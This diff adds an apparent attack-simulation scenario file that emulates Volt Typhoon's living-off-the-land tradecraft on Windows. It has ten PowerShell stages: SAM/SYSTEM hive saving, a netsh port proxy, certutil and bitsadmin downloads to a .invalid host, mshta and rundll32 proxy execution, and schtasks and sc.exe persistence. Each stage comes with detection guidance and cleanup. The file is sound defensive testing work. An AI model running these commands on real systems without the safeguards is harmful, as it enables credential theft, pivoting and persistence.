@@ -1,0 +1,436 @@
+id: volt-typhoon-lotl
+name: Volt Typhoon — Living-off-the-Land Kill Chain
+description: >
+  Ten-stage telemetry-safe emulation of Volt Typhoon (VOLTZITE / BRONZE
+  SILHOUETTE) tradecraft on Windows. Based on CISA AA24-038A, Microsoft threat
+  intelligence, and NSA/CISA/FBI joint guidance (2023-2024).
+
+  Volt Typhoon is a PRC state-sponsored actor that pre-positions in critical
+  infrastructure using almost NO malware — everything is done with built-in
+  Windows binaries (living-off-the-land). This chain exercises exactly that
+  tradecraft so you can measure whether your EDR's BEHAVIORAL analytics (not
+  signatures) catch a no-malware intrusion.
+
+  KILL CHAIN STAGES (all built-in LOLBins — no dropped tooling):
+    1.  Host Discovery         — systeminfo + wmic OS/CPU enumeration (T1082, T1047)
+    2.  Network Discovery      — ipconfig, arp, route, netstat, net use (T1016, T1049)
+    3.  netsh Port Proxy       — netsh portproxy add + delete (T1090.001) — VT signature
+    4.  Account Discovery      — net user / localgroup / group Domain Admins (T1087, T1069)
+    5.  SAM/SYSTEM Hive Theft  — reg save HKLM\SAM + SYSTEM, immediate self-delete (T1003.002)
+    6.  Shadow/NTDS Enum       — vssadmin list shadows + ntdsutil probe (T1003.003)
+    7.  LOLBin Download        — certutil + bitsadmin transfer to RFC-6761 .invalid (T1105)
+    8.  Proxy Execution        — mshta + rundll32 benign invocation (T1218.005, T1218.011)
+    9.  LOTL Persistence       — schtasks + sc.exe create + immediate delete (T1053.005, T1543.003)
+    10. Log Reconnaissance     — wevtutil enumerate + Security log info (T1070.001)
+
+  SAFETY: No malware, no real C2, no lateral movement payload. Port proxy,
+  scheduled task, and service are created and deleted in the same step. SAM/SYSTEM
+  hives are saved to a temp file and deleted immediately (encrypted hive, no bootkey,
+  no residual). Downloads target RFC-6761 .invalid domains (never routable). Logs
+  are enumerated, never cleared. All steps [BAS-SIM-VT] tagged.
+  PRODUCTION-SAFE: all ten stages run in telemetry mode. Windows only.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - volt-typhoon
+  - voltzite
+  - lotl
+  - living-off-the-land
+  - lolbin
+  - kill-chain
+  - critical-infrastructure
+  - t1082
+  - t1047
+  - t1016
+  - t1090
+  - t1087
+  - t1003
+  - t1105
+  - t1218
+  - t1053
+  - t1543
+  - t1070
+  - mitre
+mitre_phases:
+  - discovery
+  - execution
+  - credential-access
+  - defense-evasion
+  - persistence
+  - command-and-control
+
+live_policy:
+  block_on_domain_controller: true
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 — Host / System Discovery (T1082 / T1047)
+  # ---------------------------------------------------------------------------
+  - name: "Volt Typhoon Stage 1 — Host & System Discovery via systeminfo + WMIC (T1082 / T1047)"
+    technique_id: T1082
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Runs systeminfo and wmic os/computersystem get queries (read-only host enumeration). Volt Typhoon uses these first to fingerprint the host before deciding how to live off the land. Generates Sysmon EID 1 (systeminfo.exe, wmic.exe) and Security EID 4688."
+    telemetry:
+      - "Sysmon EID 1: systeminfo.exe spawned by powershell.exe"
+      - "Sysmon EID 1: wmic.exe os get / computersystem get"
+      - "Security EID 4688: WMIC and systeminfo child processes"
+    detection:
+      - "EDR: wmic.exe launched from PowerShell parent — Sigma proc_creation_win_wmic_recon.yml"
+      - "SIEM: systeminfo.exe + wmic.exe within seconds of each other — LOTL recon burst"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $si = & systeminfo.exe 2>&1 | Out-String
+      $wmicOs = & wmic.exe os get Caption,Version,OSArchitecture /format:list 2>&1 | Out-String
+      $wmicCs = & wmic.exe computersystem get Domain,Manufacturer,Model /format:list 2>&1 | Out-String
+      $ran = ($si.Length -gt 40) -or ($wmicOs.Length -gt 10)
+      Write-Output "EXEC T1082/T1047: systeminfo ($($si.Length) chars) + wmic os/computersystem enumerated. Volt Typhoon host-fingerprinting Stage 1. [BAS-SIM-VT-S1]"
+      if ($ran) {
+        Write-Output "FAIL: Built-in host discovery ran unimpeded. wmic.exe from a PowerShell parent is a strong LOTL recon signal — ensure Sysmon EID 1 is forwarded and a behavioral rule flags wmic invoked by script hosts."
+      } else {
+        Write-Output "PASS: Host discovery binaries were blocked or unavailable (WDAC/AppLocker restricting wmic/systeminfo). [BAS-SIM-VT-S1]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 — Network Configuration Discovery (T1016 / T1049)
+  # ---------------------------------------------------------------------------
+  - name: "Volt Typhoon Stage 2 — Network Configuration & Connection Discovery (T1016 / T1049)"
+    technique_id: T1016
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Runs ipconfig /all, arp -a, route print, netstat -ano, and net use (all read-only). Volt Typhoon maps the network from the host itself rather than scanning. Generates Sysmon EID 1 for each native binary and Security EID 4688."
+    telemetry:
+      - "Sysmon EID 1: ipconfig.exe, arp.exe, route.exe, netstat.exe, net.exe"
+      - "Security EID 4688: sequential network-discovery binaries from one parent"
+    detection:
+      - "EDR: rapid sequence ipconfig→arp→route→netstat from a single parent — Sigma proc_creation_win_network_recon.yml"
+      - "SIEM: five network-discovery LOLBins within one execution window — LOTL enumeration IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $ipc = & ipconfig.exe /all 2>&1 | Out-String
+      $arp = & arp.exe -a 2>&1 | Out-String
+      $route = & route.exe print 2>&1 | Out-String
+      $ns = & netstat.exe -ano 2>&1 | Out-String
+      $netUse = & net.exe use 2>&1 | Out-String
+      $listeners = ([regex]::Matches($ns, 'LISTENING')).Count
+      Write-Output "EXEC T1016/T1049: ipconfig+arp+route+netstat+net use enumerated. Listening ports observed=$listeners. Volt Typhoon network-mapping Stage 2. [BAS-SIM-VT-S2]"
+      Write-Output "FAIL: Full native network discovery ran without a behavioral alert. Five recon LOLBins in one burst should raise a single correlated detection — verify your EDR/SIEM correlates sequential ipconfig/arp/route/netstat/net use from one process tree."
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 3 — netsh Port Proxy (T1090.001) — Volt Typhoon signature
+  # ---------------------------------------------------------------------------
+  - name: "Volt Typhoon Stage 3 — netsh Port Proxy Pivot Setup + Delete (T1090.001)"
+    technique_id: T1090.001
+    framework: custom
+    executor: powershell
+    requires_priv: admin
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: medium
+    reversible: true
+    blast_radius: "Creates a netsh interface portproxy v4tov4 rule forwarding a high loopback port (59999) to 127.0.0.1:1, verifies it, then deletes it. This is Volt Typhoon's hallmark internal-pivot technique. No external listener, loopback only. Generates Sysmon EID 1 (netsh.exe) and registry writes under PortProxy."
+    telemetry:
+      - "Sysmon EID 1: netsh.exe interface portproxy add v4tov4"
+      - "Sysmon EID 13: registry write HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp"
+      - "Sysmon EID 1: netsh.exe ... portproxy delete v4tov4"
+    detection:
+      - "EDR: netsh interface portproxy add — Sigma proc_creation_win_netsh_port_fwd.yml (Volt Typhoon high-fidelity IOC)"
+      - "SIEM: any PortProxy registry key write — near-zero false positives, page immediately"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $lport = 59999
+      & netsh.exe interface portproxy add v4tov4 listenport=$lport listenaddress=127.0.0.1 connectport=1 connectaddress=127.0.0.1 2>&1 | Out-Null
+      $show = & netsh.exe interface portproxy show v4tov4 2>&1 | Out-String
+      $created = $show -match "$lport"
+      & netsh.exe interface portproxy delete v4tov4 listenport=$lport listenaddress=127.0.0.1 2>&1 | Out-Null
+      $show2 = & netsh.exe interface portproxy show v4tov4 2>&1 | Out-String
+      $deleted = -not ($show2 -match "$lport")
+      if ($created) {
+        Write-Output "EXEC T1090.001: netsh portproxy rule 127.0.0.1:$lport created then deleted=$deleted. This is the Volt Typhoon internal-pivot signature. Sysmon EID 1 + PortProxy registry write expected. [BAS-SIM-VT-S3]"
+        Write-Output "FAIL: netsh portproxy add succeeded unblocked. This is one of the highest-fidelity Volt Typhoon IOCs — a PortProxy registry write should page the SOC with near-zero false positives. Confirm the detection fired."
+      } else {
+        Write-Output "PASS: netsh portproxy creation was blocked or failed — WDAC/EDR prevented the pivot setup. [BAS-SIM-VT-S3]"
+      }
+    cleanup: |
+      & netsh.exe interface portproxy delete v4tov4 listenport=59999 listenaddress=127.0.0.1 2>&1 | Out-Null
+
+  # ---------------------------------------------------------------------------
+  # Stage 4 — Account & Group Discovery (T1087 / T1069)
+  # ---------------------------------------------------------------------------
+  - name: "Volt Typhoon Stage 4 — Local & Domain Account / Group Discovery (T1087 / T1069)"
+    technique_id: T1087.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Runs net user, net localgroup administrators, and net group 'Domain Admins' /domain (read-only). Volt Typhoon enumerates privileged accounts before credential theft. Domain query gracefully no-ops on non-domain hosts. Generates Sysmon EID 1 (net.exe / net1.exe)."
+    telemetry:
+      - "Sysmon EID 1: net.exe user / localgroup / group"
+      - "Security EID 4688: net1.exe child from net.exe"
+    detection:
+      - "EDR: net group 'Domain Admins' /domain — Sigma proc_creation_win_net_enum.yml"
+      - "SIEM: local + domain admin group enumeration from one host — privilege-mapping IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $users = & net.exe user 2>&1 | Out-String
+      $admins = & net.exe localgroup administrators 2>&1 | Out-String
+      $domainAdmins = & net.exe group "Domain Admins" /domain 2>&1 | Out-String
+      $domainJoined = $domainAdmins -notmatch 'workstation is not|not be found|is not part'
+      Write-Output "EXEC T1087/T1069: net user + localgroup administrators enumerated. Domain Admins query attempted (domain_joined=$domainJoined). Volt Typhoon privilege-mapping Stage 4. [BAS-SIM-VT-S4]"
+      Write-Output "FAIL: Local and privileged group enumeration ran unimpeded. 'net localgroup administrators' plus 'net group Domain Admins /domain' from a standard user is a classic pre-escalation recon pattern — ensure it is detected."
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 5 — SAM / SYSTEM Hive Theft via reg save (T1003.002)
+  # ---------------------------------------------------------------------------
+  - name: "Volt Typhoon Stage 5 — SAM & SYSTEM Hive Theft via reg save + Self-Delete (T1003.002)"
+    technique_id: T1003.002
+    framework: custom
+    executor: powershell
+    requires_priv: admin
+    timeout_sec: 40
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: high
+    reversible: true
+    blast_radius: "Attempts reg save HKLM\\SAM and HKLM\\SYSTEM to a temp file, then deletes both immediately. The saved SAM hive is encrypted with the bootkey (which is NOT exported), so the artifact is unusable, and it is removed in the same step. This generates the exact reg.exe SAVE telemetry Volt Typhoon produces when stealing local hashes offline. Generates Sysmon EID 1 (reg.exe save) + EID 11 (file create) + immediate delete."
+    telemetry:
+      - "Sysmon EID 1: reg.exe save HKLM\\SAM / HKLM\\SYSTEM"
+      - "Sysmon EID 11: hive file written to %TEMP% then deleted"
+      - "Security EID 4688: reg.exe with 'save' argument targeting SAM/SYSTEM"
+    detection:
+      - "EDR: reg.exe save hklm\\sam — Sigma proc_creation_win_reg_save_sam.yml (offline hash-theft IOC)"
+      - "SIEM: reg SAVE targeting SAM or SYSTEM hive — page immediately, extremely rare in normal ops"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $samOut = Join-Path $env:TEMP "bas_vt_sam_$runId.hive"
+      $sysOut = Join-Path $env:TEMP "bas_vt_sys_$runId.hive"
+      & reg.exe save HKLM\SAM $samOut /y 2>&1 | Out-Null
+      & reg.exe save HKLM\SYSTEM $sysOut /y 2>&1 | Out-Null
+      $samSaved = Test-Path $samOut
+      $sysSaved = Test-Path $sysOut
+      Remove-Item $samOut,$sysOut -Force -ErrorAction SilentlyContinue
+      if ($samSaved -or $sysSaved) {
+        Write-Output "EXEC T1003.002: reg save of SAM=$samSaved SYSTEM=$sysSaved to %TEMP% then deleted. Volt Typhoon steals these hives for OFFLINE hash extraction. reg.exe SAVE telemetry (Sysmon EID 1) expected. [BAS-SIM-VT-S5]"
+        Write-Output "FAIL: reg.exe was able to SAVE the SAM/SYSTEM hive unblocked — local password hashes can be exfiltrated for offline cracking. 'reg save hklm\\sam' should be a paging alert. Verify EDR blocked or at least alerted."
+      } else {
+        Write-Output "PASS: reg save of SAM/SYSTEM was blocked or denied — EDR/WDAC prevented offline hive theft. [BAS-SIM-VT-S5]"
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_vt_sam_*') -Force -ErrorAction SilentlyContinue
+      Remove-Item (Join-Path $env:TEMP 'bas_vt_sys_*') -Force -ErrorAction SilentlyContinue
+
+  # ---------------------------------------------------------------------------
+  # Stage 6 — Shadow Copy / NTDS Enumeration (T1003.003)
+  # ---------------------------------------------------------------------------
+  - name: "Volt Typhoon Stage 6 — Shadow Copy & NTDS.dit Enumeration Probe (T1003.003)"
+    technique_id: T1003.003
+    framework: custom
+    executor: powershell
+    requires_priv: admin
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: medium
+    reversible: true
+    blast_radius: "Runs vssadmin list shadows (read-only) and probes ntdsutil availability without invoking a snapshot or IFM export. Volt Typhoon uses vssadmin/ntdsutil to steal NTDS.dit on domain controllers. This step enumerates only — it never creates a shadow copy or dumps the database. Generates Sysmon EID 1 (vssadmin.exe, ntdsutil.exe)."
+    telemetry:
+      - "Sysmon EID 1: vssadmin.exe list shadows"
+      - "Sysmon EID 1: ntdsutil.exe (availability probe)"
+    detection:
+      - "EDR: vssadmin list shadows / ntdsutil invocation — Sigma proc_creation_win_vssadmin_ntds.yml"
+      - "SIEM: ntdsutil.exe on any host — on a DC this is a critical NTDS-theft precursor"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $shadows = & vssadmin.exe list shadows 2>&1 | Out-String
+      $shadowCount = ([regex]::Matches($shadows, 'Shadow Copy ID')).Count
+      $ntdsutilPresent = $null -ne (Get-Command ntdsutil.exe -ErrorAction SilentlyContinue)
+      Write-Output "EXEC T1003.003: vssadmin list shadows ran (existing shadow copies=$shadowCount). ntdsutil present=$ntdsutilPresent. Volt Typhoon NTDS.dit enumeration Stage 6 (no snapshot created, no dump). [BAS-SIM-VT-S6]"
+      if ($ntdsutilPresent) {
+        Write-Output "FAIL: vssadmin/ntdsutil are reachable and ran unblocked. On a domain controller these are the primary NTDS.dit theft tools — ensure ntdsutil invocation and 'vssadmin create shadow' are tightly monitored and alerted."
+      } else {
+        Write-Output "PASS: ntdsutil unavailable / vssadmin restricted in this context — reduced NTDS theft surface. [BAS-SIM-VT-S6]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 7 — LOLBin Ingress Tool Transfer (T1105)
+  # ---------------------------------------------------------------------------
+  - name: "Volt Typhoon Stage 7 — certutil + bitsadmin Download Cradle (T1105)"
+    technique_id: T1105
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 40
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Invokes certutil -urlcache -f and bitsadmin /transfer against a deterministic RFC-6761 .invalid domain (never routable). Volt Typhoon uses these LOLBins to pull tools without a browser. No file is downloaded (host does not resolve); tests LOLBin execution + egress control. Generates Sysmon EID 1 (certutil.exe, bitsadmin.exe) and EID 22 (DNS query)."
+    telemetry:
+      - "Sysmon EID 1: certutil.exe -urlcache -f <url>"
+      - "Sysmon EID 1: bitsadmin.exe /transfer"
+      - "Sysmon EID 22: DNS query to bas-sim-vt-<runid>.invalid"
+    detection:
+      - "EDR: certutil.exe with -urlcache/-split — Sigma proc_creation_win_certutil_download.yml"
+      - "EDR: bitsadmin.exe /transfer — Sigma proc_creation_win_bitsadmin_download.yml"
+      - "Proxy/DNS: outbound request to .invalid TLD — should NXDOMAIN; if it egresses, egress filtering is weak"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $url = "http://bas-sim-vt-$runId.invalid/payload.txt"
+      $dst = Join-Path $env:TEMP "bas_vt_dl_$runId.txt"
+      & certutil.exe -urlcache -split -f $url $dst 2>&1 | Out-Null
+      & bitsadmin.exe /transfer bas_vt_job /download /priority normal $url $dst 2>&1 | Out-Null
+      $downloaded = Test-Path $dst
+      Remove-Item $dst -Force -ErrorAction SilentlyContinue
+      Write-Output "EXEC T1105: certutil -urlcache + bitsadmin /transfer invoked against $url (RFC-6761 .invalid). file_downloaded=$downloaded (expected: false). Volt Typhoon LOLBin download Stage 7. [BAS-SIM-VT-S7]"
+      if ($downloaded) {
+        Write-Output "FAIL: A LOLBin download actually retrieved content from an unresolvable domain — DNS/egress filtering is misconfigured. Real Volt Typhoon tooling could be pulled the same way."
+      } else {
+        Write-Output "FAIL: certutil.exe and bitsadmin.exe ran unblocked (no download only because the domain is .invalid). These download LOLBins should be blocked or alerted by EDR/app-control regardless of the target. Verify Sysmon EID 1 detection fired."
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_vt_dl_*') -Force -ErrorAction SilentlyContinue
+      & bitsadmin.exe /cancel bas_vt_job 2>&1 | Out-Null
+
+  # ---------------------------------------------------------------------------
+  # Stage 8 — Signed Binary Proxy Execution (T1218.005 / T1218.011)
+  # ---------------------------------------------------------------------------
+  - name: "Volt Typhoon Stage 8 — mshta + rundll32 Proxy Execution (T1218.005 / T1218.011)"
+    technique_id: T1218.005
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Launches mshta.exe with an inline vbscript that closes immediately, and rundll32.exe against a benign built-in entry point. No payload, no network. Volt Typhoon uses these signed binaries to proxy execution past application control. Generates Sysmon EID 1 (mshta.exe, rundll32.exe)."
+    telemetry:
+      - "Sysmon EID 1: mshta.exe with vbscript: argument"
+      - "Sysmon EID 1: rundll32.exe invocation"
+    detection:
+      - "EDR: mshta.exe vbscript/javascript inline — Sigma proc_creation_win_mshta_inline.yml"
+      - "EDR: rundll32.exe with unusual/empty exports — Sigma proc_creation_win_rundll32.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $mshta = Start-Process mshta.exe -ArgumentList 'vbscript:Close(CreateObject("WScript.Shell").Run("cmd /c echo [BAS-SIM-VT-S8]",0,False))' -PassThru -WindowStyle Hidden
+      Start-Sleep -Milliseconds 400
+      $mshtaRan = $null -ne $mshta
+      if ($mshta) { Stop-Process -Id $mshta.Id -Force -ErrorAction SilentlyContinue }
+      $rundll = Start-Process rundll32.exe -ArgumentList 'shell32.dll,Control_RunDLL' -PassThru -WindowStyle Hidden
+      Start-Sleep -Milliseconds 400
+      $rundllRan = $null -ne $rundll
+      if ($rundll) { Stop-Process -Id $rundll.Id -Force -ErrorAction SilentlyContinue }
+      Write-Output "EXEC T1218.005/T1218.011: mshta.exe (vbscript inline, ran=$mshtaRan) + rundll32.exe (ran=$rundllRan) proxy execution. Volt Typhoon signed-binary proxy Stage 8. [BAS-SIM-VT-S8]"
+      if ($mshtaRan -or $rundllRan) {
+        Write-Output "FAIL: mshta.exe / rundll32.exe executed unblocked. These signed LOLBins are prime app-control bypass vectors — WDAC/AppLocker should restrict mshta and unusual rundll32 exports. Verify detection."
+      } else {
+        Write-Output "PASS: mshta/rundll32 proxy execution was blocked — application control restricts signed-binary proxy LOLBins. [BAS-SIM-VT-S8]"
+      }
+    cleanup: |
+      Get-Process mshta,rundll32 -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -eq '' } | Stop-Process -Force -ErrorAction SilentlyContinue
+
+  # ---------------------------------------------------------------------------
+  # Stage 9 — LOTL Persistence via schtasks + sc.exe (T1053.005 / T1543.003)
+  # ---------------------------------------------------------------------------
+  - name: "Volt Typhoon Stage 9 — Scheduled Task + Service Persistence Create/Delete (T1053.005 / T1543.003)"
+    technique_id: T1053.005
+    framework: custom
+    executor: powershell
+    requires_priv: admin
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: medium
+    reversible: true
+    blast_radius: "Creates a scheduled task and a Windows service (both pointing at cmd.exe /c echo [BAS-SIM]) and deletes each immediately. Volt Typhoon uses native schtasks/sc.exe for LOTL persistence. Task/service exist for milliseconds. Generates Security EID 4698/4699 (task), EID 7045 (service install), Sysmon EID 1."
+    telemetry:
+      - "Security EID 4698: scheduled task created (BAS-Sim-VT) + 4699 deleted"
+      - "Security/System EID 7045: new service BAS-Sim-VT-Svc installed"
+      - "Sysmon EID 1: schtasks.exe /create + sc.exe create"
+    detection:
+      - "EDR: sc.exe create + schtasks /create from PowerShell — Sigma proc_creation_win_persistence.yml"
+      - "SIEM: EID 7045 new service outside change windows — persistence IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $task = 'BAS-Sim-VT'
+      $svc = 'BAS-Sim-VT-Svc'
+      & schtasks.exe /create /tn $task /tr 'cmd.exe /c echo [BAS-SIM-VT-S9]' /sc onlogon /f 2>&1 | Out-Null
+      $taskExists = (& schtasks.exe /query /tn $task 2>&1 | Out-String) -match $task
+      & schtasks.exe /delete /tn $task /f 2>&1 | Out-Null
+      & sc.exe create $svc binPath= 'cmd.exe /c echo [BAS-SIM-VT-S9]' start= demand 2>&1 | Out-Null
+      $svcExists = (& sc.exe query $svc 2>&1 | Out-String) -match $svc
+      & sc.exe delete $svc 2>&1 | Out-Null
+      if ($taskExists -or $svcExists) {
+        Write-Output "EXEC T1053.005/T1543.003: scheduled task created=$taskExists + service created=$svcExists, both deleted. Volt Typhoon LOTL persistence Stage 9. Security EID 4698 + 7045 expected. [BAS-SIM-VT-S9]"
+        Write-Output "FAIL: Native persistence (schtasks + sc.exe) succeeded unblocked. New-service (EID 7045) and new-task (EID 4698) events must forward to the SIEM and alert outside approved change windows."
+      } else {
+        Write-Output "PASS: schtasks/sc.exe persistence creation was blocked — EDR/WDAC prevented LOTL persistence. [BAS-SIM-VT-S9]"
+      }
+    cleanup: |
+      & schtasks.exe /delete /tn 'BAS-Sim-VT' /f 2>&1 | Out-Null
+      & sc.exe delete 'BAS-Sim-VT-Svc' 2>&1 | Out-Null
+
+  # ---------------------------------------------------------------------------
+  # Stage 10 — Event Log Reconnaissance via wevtutil (T1070.001)
+  # ---------------------------------------------------------------------------
+  - name: "Volt Typhoon Stage 10 — Event Log Enumeration via wevtutil (T1070.001)"
+    technique_id: T1070.001
+    framework: custom
+    executor: powershell
+    requires_priv: admin
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Runs wevtutil el (enumerate log names) and wevtutil gli Security (get Security log metadata) — read-only. Volt Typhoon inspects and later clears logs to cover tracks; this step ENUMERATES only and never clears any log. Generates Sysmon EID 1 (wevtutil.exe)."
+    telemetry:
+      - "Sysmon EID 1: wevtutil.exe el / gli Security"
+      - "Security EID 4688: wevtutil.exe from PowerShell parent"
+    detection:
+      - "EDR: wevtutil.exe invocation — precursor to 'wevtutil cl' log clearing; Sigma proc_creation_win_wevtutil.yml"
+      - "SIEM: wevtutil querying the Security log — flag as anti-forensics reconnaissance"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $logs = & wevtutil.exe el 2>&1 | Out-String
+      $logCount = ($logs -split "`n" | Where-Object { $_.Trim() -ne '' }).Count
+      $secInfo = & wevtutil.exe gli Security 2>&1 | Out-String
+      $secReadable = $secInfo -match 'numberOfLogRecords|creationTime'
+      Write-Output "EXEC T1070.001: wevtutil enumerated $logCount log channels; Security log metadata readable=$secReadable. Volt Typhoon anti-forensics reconnaissance Stage 10 (enumerate only, no clear). [BAS-SIM-VT-S10]"
+      if ($secReadable) {
+        Write-Output "FAIL: wevtutil ran unimpeded and read the Security log configuration. wevtutil is the tool used to CLEAR logs ('wevtutil cl') — its invocation should alert, and logs should be forwarded off-host so a later clear cannot destroy evidence."
+      } else {
+        Write-Output "PASS: wevtutil was restricted or the Security log is protected — reduced anti-forensics surface. [BAS-SIM-VT-S10]"
+      }
+    cleanup: ""
